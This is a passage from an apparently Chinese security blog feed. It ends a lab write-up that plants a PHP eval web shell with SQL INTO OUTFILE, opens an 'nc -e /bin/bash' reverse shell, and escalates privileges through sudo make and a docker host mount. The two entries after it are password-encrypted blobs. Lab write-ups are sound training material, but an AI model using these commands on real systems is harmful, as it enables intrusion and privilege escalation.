&#39;&lt;?php @eval($_POST[a]);?&gt;&#39; into outfile &#39;/var/tmp/test.php&#39;;</code></pre><p><img src="https://s2.ax1x.com/2020/01/02/lYRedU.md.png" alt="lYRedU.md.png"></p><p>菜刀发现连不上..直接chrome的hakbar搞算了<br><img src="https://s2.ax1x.com/2020/01/02/lYRUFe.png" alt="lYRUFe.png"></p><p>先到home目录里走一手，把user.txt拿了<br><img src="https://s2.ax1x.com/2020/01/02/lYRLY4.png" alt="lYRLY4.png"></p><p><img src="https://s2.ax1x.com/2020/01/02/lYWCTO.png" alt="lYWCTO.png"></p><p>反弹shell</p><pre><code>nc -e /bin/bash 192.168.241.168 4444</code></pre><p><img src="https://s2.ax1x.com/2020/01/02/lYWltg.png" alt="lYWltg.png"></p><p>sudo -l一波<br><img src="https://s2.ax1x.com/2020/01/02/lYWUBV.png" alt="lYWUBV.png"></p><p>切换到dusk用户</p><pre><code>COMMAND=&#39;/bin/sh&#39;sudo -u dusk  make -s --eval=$&#39;x:\n\t-&#39;&quot;$COMMAND&quot;</code></pre><p>（这个nc发神经）<br><img src="https://s2.ax1x.com/2020/01/02/lYhqk8.png" alt="lYhqk8.png"></p><p>内核版本没法用exp，ps -elf | grep root找了一波root的服务<br><img src="https://s2.ax1x.com/2020/01/02/lY489e.md.png" alt="lY489e.md.png"></p><p>发现docker在运行，直接提取即可</p><pre><code>docker run -v /:/mnt --rm -it alpine chroot /mnt sh</code></pre><p><img src="https://s2.ax1x.com/2020/01/02/lY4LHx.png" alt="lY4LHx.png"></p>]]></content>
      
      
        <tags>
            
            <tag> 靶场练习 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Hack the box Postman</title>
      <link href="/posts/732e82ca.html"/>
      <url>/posts/732e82ca.html</url>
      <content type="html"><![CDATA[<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Please enter the password to read the blog." />    <label for="pass">Please enter the password to read the blog.</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
        <tags>
            
            <tag> htb </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Hack the box-Obscurity</title>
      <link href="/posts/5d2da26.html"/>
      <url>/posts/5d2da26.html</url>
      <content type="html"><![CDATA[<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Please enter the password to read the blog." />    <label for="pass">Please enter the password to read the blog.</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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